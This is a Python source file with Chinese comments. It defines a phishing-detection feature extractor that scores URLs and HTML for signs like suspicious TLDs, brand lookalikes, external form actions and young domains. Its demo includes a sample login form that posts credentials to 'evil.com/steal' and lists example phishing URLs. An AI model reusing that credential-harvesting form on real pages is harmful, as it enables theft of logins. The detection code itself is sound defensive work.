"""
Python 3.10.19 | Ubuntu 24.04.2 LTS
"""

import numpy as np
from urllib.parse import urlparse, parse_qs
from IPy import IP
import re
from typing import Optional, List, Dict, Tuple
import math
from collections import Counter

try:
    from tld import get_tld
    TLD_AVAILABLE = True
except ImportError:
    TLD_AVAILABLE = False
    print("Warning: tld package not available, some features will be limited")

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("Warning: whois package not available, some features will be limited")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("Warning: beautifulsoup4 not available, HTML features will be limited")


class PhishingFeatureExtractor:
    """
    完整的钓鱼检测特征提取器

    提取100维特征:
    - 索引 0-56: 基础特征 (57维)
    - 索引 57-66: 统计聚合 (10维)
    - 索引 67-81: 特征交互 (15维)
    - 索引 82-91: 领域规则 (10维)
    - 索引 92-99: 时序特征 (8维)
    """

    def __init__(self):
        """初始化特征提取器"""
        # 可疑TLD列表
        self.suspicious_tlds = {
            'tk', 'ml', 'ga', 'cf', 'gq', 'zip', 'loan', 'work', 'click',
            'link', 'top', 'xyz', 'bid', 'country', 'surf', 'cn', 'cam',
            'casa', 'bar', 'rest', 'cyou'
        }

        # URL短链服务列表
        self.url_shorteners = {
            'bit.ly', 'tinyurl.com', 'goo.gl', 't.co', 'ow.ly', 'bit.do',
            'is.gd', 'buff.ly', 'adf.ly', 'cutt.us', 'tiny.cc', 'tr.im',
            'cli.gs', 'twitthis.com', 'u.to', 'j.mp', 'qr.net'
        }

        # 知名品牌列表 (用于相似度计算)
        self.brands = [
            'paypal', 'google', 'amazon', 'microsoft', 'apple', 'facebook',
            'netflix', 'ebay', 'alibaba', 'twitter', 'instagram', 'linkedin',
            'dropbox', 'adobe', 'yahoo', 'chase', 'wellsfargo', 'bankofamerica',
            'citibank'
        ]

        # 敏感关键词
        self.sensitive_keywords = {
            'login', 'signin', 'account', 'update', 'verify', 'confirm',
            'secure', 'banking', 'password', 'urgent', 'webscr', 'ebayisapi'
        }

    # ==================== 主要接口 ====================

    def extract_features(self, url: str, html: Optional[str] = None) -> np.ndarray:
        """
        提取100维特征

        Args:
            url: 目标URL
            html: HTML内容(可选，如果提供则提取完整特征)

        Returns:
            100维numpy数组
        """
        # 提取57维基础特征
        base_features = self._extract_base_features(url, html)

        # 提取43维增强特征
        enhanced_features = self._extract_enhanced_features(base_features)

        # 合并
        all_features = np.concatenate([base_features, enhanced_features])

        return all_features.astype(np.float32)

    def extract_batch(self, urls: List[str], htmls: Optional[List[str]] = None) -> np.ndarray:
        """
        批量提取特征

        Args:
            urls: URL列表
            htmls: HTML列表(可选)

        Returns:
            特征矩阵 (N, 100)
        """
        if htmls is None:
            htmls = [None] * len(urls)

        features_list = []
        for url, html in zip(urls, htmls):
            features = self.extract_features(url, html)
            features_list.append(features)

        return np.array(features_list, dtype=np.float32)

    # ==================== 基础特征提取 (57维) ====================

    def _extract_base_features(self, url: str, html: Optional[str]) -> np.ndarray:
        """提取57维基础特征"""
        features = np.zeros(57, dtype=np.float32)

        # URL特征 (0-37)
        url_features = self._extract_url_features(url)
        features[0:38] = url_features

        # HTML特征 (38-56)
        if html:
            html_features = self._extract_html_features(url, html)
            features[38:57] = html_features

        return features

    # ==================== URL特征 (索引 0-37) ====================

    def _extract_url_features(self, url: str) -> np.ndarray:
        """提取38维URL特征"""
        features = np.zeros(38, dtype=np.float32)

        try:
            parsed = urlparse(url)
            domain = parsed.netloc
            path = parsed.path
            query = parsed.query
            fragment = parsed.fragment

            # 基础长度特征 (0-4)
            features[0] = float(len(url))
            features[1] = float(len(domain))
            features[2] = float(len(path))
            features[3] = float(len(query))
            features[4] = float(len(fragment))

            # 字符统计 (5-14)
            features[5] = float(url.count('.'))
            features[6] = float(url.count('-'))
            features[7] = float(url.count('_'))
            features[8] = float(url.count('/'))
            features[9] = float(url.count('?'))
            features[10] = float(url.count('='))
            features[11] = float(url.count('@'))
            features[12] = float(url.count('&'))

            num_digits = sum(c.isdigit() for c in url)
            features[13] = float(num_digits)
            features[14] = float(num_digits / len(url)) if len(url) > 0 else 0.0

            # 域名特征 (15-26)
            features[15] = self._check_ip_address(domain)
            features[16] = self._count_subdomains(domain)
            features[17] = self._calculate_entropy(domain)
            features[18] = self._get_tld_length(url)
            features[19] = self._is_suspicious_tld(url)
            features[20] = self._count_domain_tokens(domain)
            features[21] = float(any(c.isdigit() for c in domain))
            features[22] = float(domain.lower().startswith('www.'))
            features[23] = self._calculate_brand_similarity(domain)
            features[24] = self._is_punycode(domain)
            features[25] = self._get_registration_length(url)
            features[26] = self._get_domain_age(url)

            # 路径和参数特征 (27-37)
            features[27] = float(len([p for p in path.split('/') if p]))
            features[28] = float(len(parse_qs(query)))
            features[29] = float('login' in url.lower() or 'signin' in url.lower())
            features[30] = float('update' in url.lower())
            features[31] = float('verify' in url.lower() or 'confirm' in url.lower())
            features[32] = float('account' in url.lower())
            features[33] = float('secure' in url.lower())
            features[34] = float('bank' in url.lower() or 'banking' in url.lower())
            features[35] = self._is_url_shortener(domain)
            features[36] = self._count_suspicious_keywords(url)
            features[37] = self._calculate_entropy(query) if query else 0.0

        except Exception as e:
            pass  # 保持默认值0

        return features

    def _check_ip_address(self, domain: str) -> float:
        """检查是否是IP地址"""
        try:
            IP(domain)
            return 1.0
        except:
            # 检查十六进制编码的IP
            try:
                parts = domain.split('.')
                if len(parts) == 4:
                    ip_str = '.'.join([str(int(p, 16)) for p in parts])
                    IP(ip_str)
                    return 1.0
            except:
                pass
        return 0.0

    def _count_subdomains(self, domain: str) -> float:
        """计算子域名数量"""
        if not domain:
            return 0.0
        parts = domain.split('.')
        # 至少需要domain.tld，所以减2
        return float(max(0, len(parts) - 2))

    def _calculate_entropy(self, text: str) -> float:
        """计算Shannon熵"""
        if not text:
            return 0.0

        counter = Counter(text)
        length = len(text)
        entropy = 0.0

        for count in counter.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)

        return float(entropy)

    def _get_tld_length(self, url: str) -> float:
        """获取TLD长度"""
        if not TLD_AVAILABLE:
            return 0.0

        try:
            tld = get_tld(url, fail_silently=True)
            return float(len(tld)) if tld else 0.0
        except:
            return 0.0

    def _is_suspicious_tld(self, url: str) -> float:
        """检查是否是可疑TLD"""
        if not TLD_AVAILABLE:
            return 0.0

        try:
            tld = get_tld(url, fail_silently=True)
            if tld:
                tld_only = tld.split('.')[-1]
                return 1.0 if tld_only in self.suspicious_tlds else 0.0
        except:
            pass

        return 0.0

    def _count_domain_tokens(self, domain: str) -> float:
        """计算域名词元数"""
        if not domain:
            return 0.0

        tokens = re.split(r'[\.\-\_]+', domain)
        return float(len([t for t in tokens if t]))

    def _calculate_brand_similarity(self, domain: str) -> float:
        """计算与知名品牌的相似度"""
        if not domain:
            return 0.0

        domain_lower = domain.lower().replace('www.', '')

        max_similarity = 0.0
        for brand in self.brands:
            # 简单的相似度计算: 公共字符数 / 较长字符串长度
            common = sum((Counter(domain_lower) & Counter(brand)).values())
            max_len = max(len(domain_lower), len(brand))
            similarity = common / max_len if max_len > 0 else 0.0
            max_similarity = max(max_similarity, similarity)

        return float(max_similarity)

    def _is_punycode(self, domain: str) -> float:
        """检查是否使用Punycode"""
        if not domain:
            return 0.0

        parts = domain.split('.')
        for part in parts:
            if part.startswith('xn--'):
                return 1.0

        return 0.0

    def _get_registration_length(self, url: str) -> float:
        """获取域名注册时长(天)"""
        if not WHOIS_AVAILABLE:
            return 0.0

        try:
            w = whois.whois(url)
            if w and 'creation_date' in w and 'expiration_date' in w:
                creation = w['creation_date']
                expiration = w['expiration_date']

                if isinstance(creation, list):
                    creation = creation[0]
                if isinstance(expiration, list):
                    expiration = expiration[0]

                if creation and expiration:
                    delta = expiration - creation
                    return float(delta.days)
        except:
            pass

        return 0.0

    def _get_domain_age(self, url: str) -> float:
        """获取域名年龄(天)"""
        if not WHOIS_AVAILABLE:
            return 0.0

        try:
            from datetime import datetime
            w = whois.whois(url)
            if w and 'creation_date' in w:
                creation = w['creation_date']

                if isinstance(creation, list):
                    creation = creation[0]

                if creation:
                    now = datetime.now()
                    delta = now - creation
                    return float(delta.days)
        except:
            pass

        return 0.0

    def _is_url_shortener(self, domain: str) -> float:
        """检查是否是短链服务"""
        domain_lower = domain.lower()
        for shortener in self.url_shorteners:
            if shortener in domain_lower:
                return 1.0
        return 0.0

    def _count_suspicious_keywords(self, url: str) -> float:
        """统计可疑关键词数量"""
        url_lower = url.lower()
        count = 0
        for keyword in self.sensitive_keywords:
            count += url_lower.count(keyword)
        return float(count)

    # ==================== HTML特征 (索引 38-56) ====================

    def _extract_html_features(self, url: str, html: str) -> np.ndarray:
        """提取19维HTML特征"""
        features = np.zeros(19, dtype=np.float32)

        if not BS4_AVAILABLE or not html:
            return features

        try:
            soup = BeautifulSoup(html, 'html.parser')

            # 表单特征 (38-45 -> 0-7)
            forms = soup.find_all('form')
            features[0] = float(len(forms))

            inputs = soup.find_all('input')
            features[1] = float(len(inputs))

            password_fields = soup.find_all('input', {'type': 'password'})
            features[2] = float(len(password_fields))

            hidden_fields = soup.find_all('input', {'type': 'hidden'})
            features[3] = float(len(hidden_fields))

            features[4] = float(any(f.get('action') for f in forms))
            features[5] = self._check_external_form_action(url, forms)
            features[6] = float(len(password_fields) > 0)
            features[7] = self._check_form_to_email(forms)

            # 链接特征 (46-51 -> 8-13)
            links = soup.find_all('a')
            features[8] = float(len(links))
            features[9] = self._calculate_external_link_ratio(url, links)
            features[10] = self._calculate_null_link_ratio(links)
            features[11] = self._count_external_redirects(url, links)
            features[12] = self._check_suspicious_links(links)
            features[13] = self._check_external_favicon(url, soup)

            # 多媒体特征 (52-56 -> 14-18)
            images = soup.find_all('img')
            features[14] = float(len(images))
            features[15] = self._calculate_external_ratio(url, images, 'src')

            iframes = soup.find_all('iframe')
            features[16] = float(len(iframes))

            scripts = soup.find_all('script')
            features[17] = float(len(scripts))
            features[18] = self._calculate_external_ratio(url, scripts, 'src')

        except Exception as e:
            pass

        return features

    def _check_external_form_action(self, url: str, forms: list) -> float:
        """检查表单是否提交到外部域名"""
        try:
            parsed_url = urlparse(url)
            current_domain = parsed_url.netloc

            for form in forms:
                action = form.get('action', '')
                if action and not action.startswith('#'):
                    if action.startswith('http'):
                        action_domain = urlparse(action).netloc
                        if action_domain and action_domain != current_domain:
                            return 1.0
        except:
            pass

        return 0.0

    def _check_form_to_email(self, forms: list) -> float:
        """检查表单是否提交到邮箱"""
        for form in forms:
            action = form.get('action', '')
            if 'mailto:' in action.lower():
                return 1.0
        return 0.0

    def _calculate_external_link_ratio(self, url: str, links: list) -> float:
        """计算外部链接比例"""
        if not links:
            return 0.0

        try:
            parsed_url = urlparse(url)
            current_domain = parsed_url.netloc

            external_count = 0
            for link in links:
                href = link.get('href', '')
                if href and href.startswith('http'):
                    link_domain = urlparse(href).netloc
                    if link_domain and link_domain != current_domain:
                        external_count += 1

            return float(external_count / len(links))
        except:
            return 0.0

    def _calculate_null_link_ratio(self, links: list) -> float:
        """计算空链接比例"""
        if not links:
            return 0.0

        null_links = ['#', 'javascript:void(0)', 'javascript:;', '#content',
                     '#skip', '', '#null', 'javascript::void(0)', 'javascript::']

        null_count = 0
        for link in links:
            href = link.get('href', '')
            if href.lower() in [n.lower() for n in null_links]:
                null_count += 1

        return float(null_count / len(links))

    def _count_external_redirects(self, url: str, links: list) -> float:
        """统计外部重定向链接数"""
        try:
            parsed_url = urlparse(url)
            current_domain = parsed_url.netloc

            count = 0
            for link in links:
                href = link.get('href', '')
                if 'redirect' in href.lower():
                    if href.startswith('http'):
                        link_domain = urlparse(href).netloc
                        if link_domain != current_domain:
                            count += 1

            return float(count)
        except:
            return 0.0

    def _check_suspicious_links(self, links: list) -> float:
        """检查是否有可疑链接"""
        suspicious_patterns = ['.exe', '.zip', '.rar', 'download', '.bat',
                              '.cmd', 'virus', 'hack', 'phish', 'scam', 'malware']

        for link in links:
            href = link.get('href', '').lower()
            for pattern in suspicious_patterns:
                if pattern in href:
                    return 1.0

        return 0.0

    def _check_external_favicon(self, url: str, soup) -> float:
        """检查favicon是否来自外部"""
        try:
            parsed_url = urlparse(url)
            current_domain = parsed_url.netloc

            favicon = soup.find('link', rel='shortcut icon')
            if not favicon:
                favicon = soup.find('link', rel='icon')
            if not favicon:
                favicon = soup.find('link', rel='apple-touch-icon')

            if favicon:
                href = favicon.get('href', '')
                if href.startswith('http'):
                    favicon_domain = urlparse(href).netloc
                    if favicon_domain and favicon_domain != current_domain:
                        return 1.0
        except:
            pass

        return 0.0

    def _calculate_external_ratio(self, url: str, elements: list, attr: str) -> float:
        """计算外部资源比例"""
        if not elements:
            return 0.0

        try:
            parsed_url = urlparse(url)
            current_domain = parsed_url.netloc

            external_count = 0
            valid_count = 0

            for elem in elements:
                src = elem.get(attr, '')
                if src:
                    valid_count += 1
                    if src.startswith('http'):
                        src_domain = urlparse(src).netloc
                        if src_domain and src_domain != current_domain:
                            external_count += 1

            if valid_count > 0:
                return float(external_count / valid_count)
        except:
            pass

        return 0.0

    # ==================== 增强特征 (43维) ====================

    def _extract_enhanced_features(self, base_features: np.ndarray) -> np.ndarray:
        """提取43维增强特征"""
        enhanced = np.zeros(43, dtype=np.float32)

        # 统计聚合 (0-9)
        enhanced[0:10] = self._compute_statistical_features(base_features)

        # 特征交互 (10-24)
        enhanced[10:25] = self._compute_interaction_features(base_features)

        # 领域规则 (25-34)
        enhanced[25:35] = self._compute_domain_rules(base_features)

        # 时序特征 (35-42)
        enhanced[35:43] = self._compute_temporal_features(base_features)

        return enhanced

    def _compute_statistical_features(self, features: np.ndarray) -> np.ndarray:
        """统计聚合特征 (10维)"""
        url_feats = features[0:38]
        html_feats = features[38:57]

        stats = np.array([
            np.mean(url_feats),
            np.std(url_feats),
            np.max(url_feats),
            np.min(url_feats),
            float(np.sum(url_feats > 0)),
            np.mean(html_feats),
            np.std(html_feats),
            np.max(html_feats),
            np.min(html_feats),
            float(np.sum(html_feats > 0))
        ], dtype=np.float32)

        return stats

    def _compute_interaction_features(self, features: np.ndarray) -> np.ndarray:
        """特征交互 (15维)"""
        url_length = features[0]
        domain_length = features[1]
        path_length = features[2]
        num_dots = features[5]
        num_hyphens = features[6]
        has_ip = features[15]
        num_subdomains = features[16]
        domain_entropy = features[17]
        is_suspicious_tld = features[19]
        domain_brand_similarity = features[23]

        num_forms = features[38]
        num_password = features[40]
        num_hidden = features[41]
        external_link_ratio = features[47]
        num_images = features[52]

        interactions = np.array([
            url_length / max(domain_length, 1),
            path_length / max(url_length, 1),
            domain_length * num_subdomains,
            num_dots * num_subdomains,
            num_hyphens * domain_entropy,
            is_suspicious_tld * domain_entropy,
            has_ip * num_forms,
            domain_brand_similarity * is_suspicious_tld,
            num_password / max(num_forms, 1),
            num_hidden / max(num_forms, 1),
            external_link_ratio * num_forms,
            num_password * external_link_ratio,
            num_images / max(num_forms, 1),
            num_images * external_link_ratio,
            float((num_password > 0) and (external_link_ratio > 0.3))
        ], dtype=np.float32)

        return interactions

    def _compute_domain_rules(self, features: np.ndarray) -> np.ndarray:
        """领域知识规则 (10维)"""
        url_length = features[0]
        domain_length = features[1]
        num_dots = features[5]
        num_hyphens = features[6]
        has_ip = features[15]
        num_subdomains = features[16]
        domain_entropy = features[17]
        is_suspicious_tld = features[19]
        domain_brand_similarity = features[23]
        punycode = features[24]
        has_login_kw = features[29]
        has_verify_kw = features[31]
        has_secure_kw = features[33]

        num_forms = features[38]
        num_password = features[40]
        form_action_external = features[43]
        external_link_ratio = features[47]
        favicon_external = features[51]

        rules = np.array([
            float(domain_brand_similarity > 0.6 and is_suspicious_tld == 1),
            float(punycode == 1 and domain_brand_similarity > 0.5),
            float((has_login_kw + has_verify_kw + has_secure_kw) >= 2),
            float(num_password > 0 and form_action_external == 1),
            float(has_ip == 1 and num_password > 0),
            float(url_length > 75 and is_suspicious_tld == 1),
            float(domain_entropy > 3.5 and num_subdomains >= 2),
            float(favicon_external == 1 and form_action_external == 1 and external_link_ratio > 0.4),
            float(num_subdomains >= 3 and num_hyphens >= 2),
            float(domain_length < 8 and domain_entropy > 3.0)
        ], dtype=np.float32)

        return rules

    def _compute_temporal_features(self, features: np.ndarray) -> np.ndarray:
        """时序特征 (8维)"""
        domain_registration_length = features[25]
        domain_age = features[26]

        temporal = np.array([
            float(domain_age == 0),
            float(0 < domain_age < 30),
            float(30 <= domain_age < 180),
            float(domain_age >= 365),
            float(domain_registration_length == 0),
            float(0 < domain_registration_length < 365),
            float(domain_registration_length >= 365),
            domain_age / max(domain_registration_length, 1)
        ], dtype=np.float32)

        return temporal

    # ==================== 辅助方法 ====================

    def get_feature_names(self) -> List[str]:
        """获取所有100个特征的名称"""
        base_names = [
            # URL特征 (0-37)
            'url_length', 'domain_length', 'path_length', 'query_length',
            'fragment_length', 'num_dots', 'num_hyphens', 'num_underscores',
            'num_slashes', 'num_questionmarks', 'num_equals', 'num_ats',
            'num_ampersands', 'num_digits', 'digit_ratio', 'has_ip_address',
            'num_subdomains', 'domain_entropy', 'tld_length', 'is_suspicious_tld',
            'domain_token_count', 'domain_has_digits', 'subdomain_has_www',
            'domain_brand_similarity', 'punycode_domain', 'domain_registration_length',
            'domain_age', 'path_depth', 'num_params', 'has_login_keyword',
            'has_update_keyword', 'has_verify_keyword', 'has_account_keyword',
            'has_secure_keyword', 'has_banking_keyword', 'url_shortening_service',
            'has_suspicious_keywords', 'param_entropy',

            # HTML特征 (38-56)
            'num_forms', 'num_input_fields', 'num_password_fields',
            'num_hidden_fields', 'form_has_action', 'form_action_external',
            'has_login_form', 'form_to_email', 'num_links', 'external_link_ratio',
            'null_link_ratio', 'num_external_redirects', 'has_suspicious_links',
            'favicon_external', 'num_images', 'external_image_ratio', 'num_iframes',
            'num_scripts', 'external_script_ratio'
        ]

        enhanced_names = [
            # 统计聚合 (57-66)
            'url_mean', 'url_std', 'url_max', 'url_min', 'url_nonzero_count',
            'html_mean', 'html_std', 'html_max', 'html_min', 'html_nonzero_count',

            # 特征交互 (67-81)
            'url_domain_length_ratio', 'path_url_length_ratio', 'domain_subdomain_product',
            'dots_subdomains_product', 'hyphens_entropy_product', 'suspicious_tld_entropy_product',
            'ip_forms_product', 'brand_similarity_suspicious_tld_product',
            'password_form_ratio', 'hidden_form_ratio', 'external_link_forms_product',
            'password_external_link_product', 'images_forms_ratio', 'images_external_link_product',
            'login_high_external_link',

            # 领域规则 (82-91)
            'rule_typosquatting', 'rule_homograph_attack', 'rule_phishing_kit',
            'rule_credential_harvesting', 'rule_ip_login_form', 'rule_long_url_suspicious_tld',
            'rule_high_entropy_multi_subdomain', 'rule_external_resources',
            'rule_complex_subdomain_structure', 'rule_short_high_entropy_domain',

            # 时序特征 (92-99)
            'no_domain_age', 'very_new_domain', 'new_domain', 'old_domain',
            'no_registration_length', 'short_registration', 'long_registration',
            'age_registration_ratio'
        ]

        return base_names + enhanced_names

    def get_num_features(self) -> int:
        """获取特征总数"""
        return 100


# ==================== 使用示例 ====================

def main():
    """使用示例"""

    print("="*80)
    print("钓鱼检测特征提取器 - 独立版本")
    print("="*80)

    # 初始化
    extractor = PhishingFeatureExtractor()

    # 示例1: 提取URL特征(无HTML)
    print("\n示例1: 仅URL特征提取")
    print("-"*80)

    url1 = "https://paypa1-verify.tk/urgent-login?id=123"
    features1 = extractor.extract_features(url1)

    print(f"URL: {url1}")
    print(f"特征维度: {features1.shape}")
    print(f"特征类型: {features1.dtype}")
    print(f"\n关键特征:")
    print(f"  - domain_entropy: {features1[17]:.3f}")
    print(f"  - is_suspicious_tld: {features1[19]:.1f}")
    print(f"  - domain_brand_similarity: {features1[23]:.3f}")
    print(f"  - rule_typosquatting: {features1[82]:.1f}")

    # 示例2: 带HTML的完整特征
    print("\n示例2: 完整特征提取(URL+HTML)")
    print("-"*80)

    url2 = "https://example.com/login"
    html2 = """
    <html>
        <head><title>Login</title></head>
        <body>
            <form action="http://evil.com/steal">
                <input type="text" name="username">
                <input type="password" name="password">
                <input type="submit">
            </form>
            <a href="http://external.com">Link</a>
            <img src="http://cdn.com/logo.png">
        </body>
    </html>
    """

    features2 = extractor.extract_features(url2, html2)

    print(f"URL: {url2}")
    print(f"特征维度: {features2.shape}")
    print(f"\nHTML特征:")
    print(f"  - num_forms: {features2[38]:.0f}")
    print(f"  - num_password_fields: {features2[40]:.0f}")
    print(f"  - form_action_external: {features2[43]:.1f}")
    print(f"  - external_link_ratio: {features2[47]:.3f}")
    print(f"  - rule_credential_harvesting: {features2[85]:.1f}")

    # 示例3: 批量处理
    print("\n示例3: 批量特征提取")
    print("-"*80)

    urls = [
        "https://paypal.com",
        "https://paypa1.tk",
        "http://192.168.1.1/phishing"
    ]

    batch_features = extractor.extract_batch(urls)

    print(f"批量URL数: {len(urls)}")
    print(f"特征矩阵: {batch_features.shape}")
    print(f"\n每个URL的可疑度评分(基于规则特征):")

    for i, url in enumerate(urls):
        # 简单评分: 规则特征(82-91)的总和
        rule_score = np.sum(batch_features[i, 82:92])
        print(f"  {url}: {rule_score:.0f}/10")

    # 示例4: 特征名称
    print("\n示例4: 特征名称")
    print("-"*80)

    feature_names = extractor.get_feature_names()
    print(f"总特征数: {extractor.get_num_features()}")
    print(f"\n前10个特征: {feature_names[:10]}")
    print(f"最后10个特征: {feature_names[-10:]}")

    # 示例5: 与NumPy/PyTorch集成
    print("\n示例5: 与机器学习框架集成")
    print("-"*80)

    # NumPy
    features_np = extractor.extract_features(url1)
    print(f"NumPy数组: {features_np.shape}, dtype={features_np.dtype}")

    # PyTorch (如果安装)
    try:
        import torch
        features_torch = torch.from_numpy(features_np)
        print(f"PyTorch张量: {features_torch.shape}, dtype={features_torch.dtype}")
    except ImportError:
        print("PyTorch未安装,跳过PyTorch示例")

    print("\n" + "="*80)
    print("测试完成!")
    print("="*80)


if __name__ == '__main__':
    main()